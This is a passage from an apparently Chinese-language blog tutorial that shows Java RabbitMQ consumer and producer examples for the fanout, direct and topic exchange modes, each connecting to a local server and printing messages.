创建连接工厂</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">//设置RabbitMQ地址</span></span><br><span class="line">        factory.setHost(<span class="string">"localhost"</span>);</span><br><span class="line">        <span class="comment">//创建一个新的连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">//创建一个通道</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line">        <span class="comment">//交换机声明（参数为：交换机名称；交换机类型）</span></span><br><span class="line">        channel.exchangeDeclare(EXCHANGE_NAME,<span class="string">"fanout"</span>);</span><br><span class="line">        <span class="comment">//获取一个临时队列</span></span><br><span class="line">        String queueName = channel.queueDeclare().getQueue();</span><br><span class="line">        <span class="comment">//队列与交换机绑定（参数为：队列名称；交换机名称；routingKey忽略）</span></span><br><span class="line">        channel.queueBind(queueName,EXCHANGE_NAME,<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(name +<span class="string">" 等待接受消息"</span>);</span><br><span class="line">        <span class="comment">//DefaultConsumer类实现了Consumer接口，通过传入一个频道，</span></span><br><span class="line">        <span class="comment">// 告诉服务器我们需要那个频道的消息，如果频道中有消息，就会执行回调函数handleDelivery</span></span><br><span class="line">        Consumer consumer = <span class="keyword">new</span> DefaultConsumer(channel) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       AMQP.BasicProperties properties, <span class="keyword">byte</span>[] body)</span></span></span><br><span class="line"><span class="function">                    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                String message = <span class="keyword">new</span> String(body, <span class="string">"UTF-8"</span>);</span><br><span class="line">                System.out.println(name + <span class="string">" 接收到消息 '"</span> + message + <span class="string">"'"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//自动回复队列应答 -- RabbitMQ中的消息确认机制</span></span><br><span class="line">        channel.basicConsume(queueName, <span class="keyword">true</span>, consumer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="发送消息Producer"><a href="#发送消息Producer" class="headerlink" title="发送消息Producer"></a>发送消息Producer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.how2j.testrabbitmq;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Channel;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Connection;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 消息生成者</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FanoutProducer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String EXCHANGE_NAME=<span class="string">"fanout_exchange"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        RabbitMQUtil.checkServer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建连接工厂</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">//设置RabbitMQ相关信息</span></span><br><span class="line">        factory.setHost(<span class="string">"localhost"</span>);</span><br><span class="line">        <span class="comment">//创建一个新的连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">//创建一个通道</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line"></span><br><span class="line">        channel.exchangeDeclare(EXCHANGE_NAME, <span class="string">"fanout"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            String message = <span class="string">"direct 消息 "</span> +i;</span><br><span class="line">            <span class="comment">//发送消息到队列中</span></span><br><span class="line">            channel.basicPublish(EXCHANGE_NAME, <span class="string">""</span>, <span class="keyword">null</span>, message.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">            System.out.println(<span class="string">"发送消息： "</span> + message);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//关闭通道和连接</span></span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="先运行两次-FanoutCustomer-启动两个消费者，再运行一次-FanoutProducer-启动生产者。效果如下："><a href="#先运行两次-FanoutCustomer-启动两个消费者，再运行一次-FanoutProducer-启动生产者。效果如下：" class="headerlink" title="先运行两次 FanoutCustomer 启动两个消费者，再运行一次 FanoutProducer 启动生产者。效果如下："></a>先运行两次 FanoutCustomer 启动两个消费者，再运行一次 FanoutProducer 启动生产者。效果如下：</h4><p><img src="RabbitMQ_7.png" alt=""></p><h3 id="Direct模式"><a href="#Direct模式" class="headerlink" title="Direct模式"></a>Direct模式</h3><h4 id="除了生产者和消费者不同，其余与Fanout一致。"><a href="#除了生产者和消费者不同，其余与Fanout一致。" class="headerlink" title="除了生产者和消费者不同，其余与Fanout一致。"></a>除了生产者和消费者不同，其余与Fanout一致。</h4><h4 id="接收消息Customer-1"><a href="#接收消息Customer-1" class="headerlink" title="接收消息Customer"></a>接收消息Customer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.how2j.testrabbitmq;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.AMQP;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Channel;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Connection;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Consumer;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.DefaultConsumer;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Envelope;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.RandomUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirectCustomer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String QUEUE_NAME = <span class="string">"direct_queue"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        <span class="comment">//为当前消费者取随机名</span></span><br><span class="line">        String name = <span class="string">"consumer-"</span>+ RandomUtil.randomString(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断服务器是否启动</span></span><br><span class="line">        RabbitMQUtil.checkServer();</span><br><span class="line">        <span class="comment">// 创建连接工厂</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">//设置RabbitMQ地址</span></span><br><span class="line">        factory.setHost(<span class="string">"localhost"</span>);</span><br><span class="line">        <span class="comment">//创建一个新的连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">//创建一个通道</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line">        <span class="comment">//声明要关注的队列</span></span><br><span class="line">        channel.queueDeclare(QUEUE_NAME, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">true</span>, <span class="keyword">null</span>);</span><br><span class="line">        System.out.println(name +<span class="string">" 等待接受消息"</span>);</span><br><span class="line">        <span class="comment">//DefaultConsumer类实现了Consumer接口，通过传入一个频道，</span></span><br><span class="line">        <span class="comment">// 告诉服务器我们需要那个频道的消息，如果频道中有消息，就会执行回调函数handleDelivery</span></span><br><span class="line">        Consumer consumer = <span class="keyword">new</span> DefaultConsumer(channel) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       AMQP.BasicProperties properties, <span class="keyword">byte</span>[] body)</span></span></span><br><span class="line"><span class="function">                    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                String message = <span class="keyword">new</span> String(body, <span class="string">"UTF-8"</span>);</span><br><span class="line">                System.out.println(name + <span class="string">" 接收到消息 '"</span> + message + <span class="string">"'"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//自动回复队列应答 -- RabbitMQ中的消息确认机制</span></span><br><span class="line">        channel.basicConsume(QUEUE_NAME, <span class="keyword">true</span>, consumer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="发送消息Producer-1"><a href="#发送消息Producer-1" class="headerlink" title="发送消息Producer"></a>发送消息Producer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.how2j.testrabbitmq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Channel;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Connection;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 消息生成者</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirectProducer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String QUEUE_NAME=<span class="string">"direct_queue"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        RabbitMQUtil.checkServer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建连接工厂</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">//设置RabbitMQ相关信息</span></span><br><span class="line">        factory.setHost(<span class="string">"localhost"</span>);</span><br><span class="line">        <span class="comment">//创建一个新的连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">//创建一个通道</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            String message = <span class="string">"direct 消息 "</span> +i;</span><br><span class="line">            <span class="comment">//发送消息到队列中</span></span><br><span class="line">            channel.basicPublish(<span class="string">""</span>, QUEUE_NAME, <span class="keyword">null</span>, message.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">            System.out.println(<span class="string">"发送消息： "</span> + message);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//关闭通道和连接</span></span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="RabbitMQ_8.png" alt=""></p><h3 id="Topic模式"><a href="#Topic模式" class="headerlink" title="Topic模式"></a>Topic模式</h3><h4 id="除了生产者和消费者不同，其余与Fanout一致。-1"><a href="#除了生产者和消费者不同，其余与Fanout一致。-1" class="headerlink" title="除了生产者和消费者不同，其余与Fanout一致。"></a>除了生产者和消费者不同，其余与Fanout一致。</h4><h4 id="接收消息Customer-2"><a href="#接收消息Customer-2" class="headerlink" title="接收消息Customer"></a>接收消息Customer</h4><h5 id="USA"><a href="#USA" class="headerlink" title="USA"></a>USA</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.how2j.testrabbitmq;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.AMQP;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Channel;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Connection;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Consumer;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.DefaultConsumer;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Envelope;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TopicCustomerUSA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String EXCHANGE_NAME=<span class="string">"topics_exchange"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        <span class="comment">//为当前消费者取名称</span></span><br><span class="line">        String name = <span class="string">"consumer-usa"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断服务器是否启动</span></span><br><span class="line">        RabbitMQUtil.checkServer();</span><br><span class="line">        <span class="comment">// 创建连接工厂</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">//设置RabbitMQ地址</span></span><br><span class="line">        factory.setHost(<span class="string">"localhost"</span>);</span><br><span class="line">        <span class="comment">//创建一个新的连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">//创建一个通道</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line">        <span class="comment">//交换机声明（参数为：交换机名称；交换机类型）</span></span><br><span class="line">        channel.exchangeDeclare(EXCHANGE_NAME,<span class="string">"topic"</span>);</span><br><span class="line">        <span class="comment">//获取一个临时队列</span></span><br><span class="line">        String queueName = channel.queueDeclare().getQueue();</span><br><span class="line">        <span class="comment">//接受 USA 信息</span></span><br><span class="line"></span><br><span class="line">        channel.queueBind(queueName, EXCHANGE_NAME, <span class="string">"usa.*"</span>);</span><br><span class="line">        System.out.println(name +<span class="string">" 等待接受消息"</span>);</span><br><span class="line">        <span class="comment">//DefaultConsumer类实现了Consumer接口，通过传入一个频道，</span></span><br><span class="line">        <span class="comment">// 告诉服务器我们需要那个频道的消息，如果频道中有消息，就会执行回调函数handleDelivery</span></span><br><span class="line">        Consumer consumer = <span class="keyword">new</span> DefaultConsumer(channel) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       AMQP.BasicProperties properties, <span class="keyword">byte</span>[] body)</span></span></span><br><span class="line"><span class="function">                    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                String message = <span class="keyword">new</span> String(body, <span class="string">"UTF-8"</span>);</span><br><span class="line">                System.out.println(name + <span class="string">" 接收到消息 '"</span> + message + <span class="string">"'"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//自动回复队列应答 -- RabbitMQ中的消息确认机制</span></span><br><span class="line">        channel.basicConsume(queueName, <span class="keyword">true</span>, consumer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="News"><a href="#News" class="headerlink" title="News"></a>News</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.how2j.testrabbitmq;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.AMQP;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Channel;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Connection;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Consumer;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.DefaultConsumer;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Envelope;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TopicCustomerNews</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String EXCHANGE_NAME=<span class="string">"topics_exchange"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        <span class="comment">//为当前消费者取名称</span></span><br><span class="line">        String name = <span class="string">"consumer-news"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断服务器是否启动</span></span><br><span class="line">        RabbitMQUtil.checkServer();</span><br><span class="line">        <span class="comment">// 创建连接工厂</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">//设置RabbitMQ地址</span></span><br><span class="line">        factory.setHost(<span class="string">"localhost"</span>);</span><br><span class="line">        <span class="comment">//创建一个新的连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">//创建一个通道</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line">        <span class="comment">//交换机声明（参数为：交换机名称；交换机类型）</span></span><br><span class="line">        channel.exchangeDeclare(EXCHANGE_NAME,<span class="string">"topic"</span>);</span><br><span class="line">        <span class="comment">//获取一个临时队列</span></span><br><span class="line">        String queueName = channel.queueDeclare().getQueue();</span><br><span class="line">        <span class="comment">//接受 USA 信息</span></span><br><span class="line"></span><br><span class="line">        channel.queueBind(queueName, EXCHANGE_NAME, <span class="string">"*.news"</span>);</span><br><span class="line">        System.out.println(name +<span class="string">" 等待接受消息"</span>);</span><br><span class="line">        <span class="comment">//DefaultConsumer类实现了Consumer接口，通过传入一个频道，</span></span><br><span class="line">        <span class="comment">// 告诉服务器我们需要那个频道的消息，如果频道中有消息，就会执行回调函数handleDelivery</span></span><br><span class="line">        Consumer consumer = <span class="keyword">new</span> DefaultConsumer(channel) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       AMQP.BasicProperties properties, <span class="keyword">byte</span>[] body)</span></span></span><br><span class="line"><span class="function">                    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                String message = <span class="keyword">new</span> String(body, <span class="string">"UTF-8"</span>);</span><br><span class="line">                System.out.println(name + <span class="string">" 接收到消息 '"</span> + message + <span class="string">"'"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//自动回复队列应答 -- RabbitMQ中的消息确认机制</span></span><br><span class="line">        channel.basicConsume(queueName, <span class="keyword">true</span>, consumer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="发送消息Producer-2"><a href="#发送消息Producer-2" class="headerlink" title="发送消息Producer"></a>发送消息Producer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.how2j.testrabbitmq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Channel;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Connection;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 消息生成者</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TopicProducer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String EXCHANGE_NAME=<span class="string">"topics_exchange"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        RabbitMQUtil.checkServer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建连接工厂</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">//设置RabbitMQ相关信息</span></span><br><span class="line">        factory.setHost(<span class="string">"localhost"</span>);</span><br><span class="line">        <span class="comment">//创建一个新的连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">//创建一个通道</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line"></span><br><span class="line">        channel.exchangeDeclare(EXCHANGE_NAME, <span class="string">"topic"</span>);</span><br><span class="line"></span><br><span class="line">        String[] routing_keys = <span class="keyword">new</span> String[] &#123; <span class="string">"usa.news"</span>, <span class="string">"usa.weather"</span>,</span><br><span class="line">                <span class="string">"europe.news"</span>, <span class="string">"europe.weather"</span> &#125;;</span><br><span class="line">        String[] messages = <span class="keyword">new</span> String[] &#123; <span class="string">"美国新闻"</span>, <span class="string">"美国天气"</span>,</span><br><span class="line">                <span class="string">"欧洲新闻"</span>, <span class="string">"欧洲天气"</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; routing_keys.length; 